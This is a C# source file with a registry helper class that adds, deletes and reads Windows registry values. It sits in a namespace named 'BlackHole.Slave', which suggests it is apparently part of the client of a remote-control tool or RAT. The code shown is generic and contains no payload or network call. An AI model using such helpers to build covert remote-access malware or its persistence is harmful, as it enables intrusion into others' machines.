using System;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;

namespace BlackHole.Slave.Helper
{
    public static class RegistryHelper
    {
        public static bool AddRegistryKeyValue(RegistryHive hive, string path, string name, string value, bool addQuotes = false) =>
            RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path,
                key =>
                {
                    if (addQuotes && !value.StartsWith("\"") && !value.EndsWith("\""))
                        value = "\"" + value + "\"";

                    key.SetValue(name, value);
                    return true;
                });

        public static bool OpenReadonlySubKey(RegistryHive hive, string path, Func<RegistryKey, bool> onSuccess)
        {
            try
            {
                using (var key = RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenSubKey(path, false))
                {
                    if (key == null)
                        return false;

                    return onSuccess(key);
                }
            }
            catch
            {
                return false;
            }
        }

        public static bool DeleteRegistryKeyValue(RegistryHive hive, string path, string name) =>
            RegistryKey.OpenBaseKey(hive, RegistryView.Registry64).OpenWritableSubKeySafe(path,
                key =>
                {
                    key.DeleteValue(name, true);
                    return true;
                });
        
        private static bool IsNameOrValueNull(this string keyName, RegistryKey key) =>
            string.IsNullOrEmpty(keyName) || (key == null);
        
        public static string GetValueSafe(this RegistryKey key, string keyName, string defaultValue = "")
        {
            try
            {
                return key.GetValue(keyName, defaultValue).ToString();
            }
            catch
            {
                return defaultValue;
            }
        }
        
        public static bool OpenReadonlySubKeySafe(this RegistryKey key, string name, Func<RegistryKey, bool> onSuccess)
        {
            try
            {
                using (var subKey = key.OpenSubKey(name, false))
                {
                    if (subKey == null)
                        return false;
                    return onSuccess(subKey);
                }
            }
            catch
            {
                return false;
            }
        }
        
        public static bool OpenWritableSubKeySafe(this RegistryKey key, string name, Func<RegistryKey, bool> onSuccess)
        {
            try
            {
                using (var subKey = key.OpenSubKey(name, true))
                {
                    if (subKey == null)
                        return false;
                    return onSuccess(subKey);
                }
            }
            catch
            {
                return false;
            }
        }
        
        public static IEnumerable<string> GetFormattedKeyValues(this RegistryKey key)
        {
            if (key == null)
                yield break;

            foreach (var k in key.GetValueNames()
                .Where(keyVal => !keyVal.IsNameOrValueNull(key))
                .Where(k => !string.IsNullOrEmpty(k)))            
                yield return $"{k}||{key.GetValueSafe(k)}";            
        }
    }
}
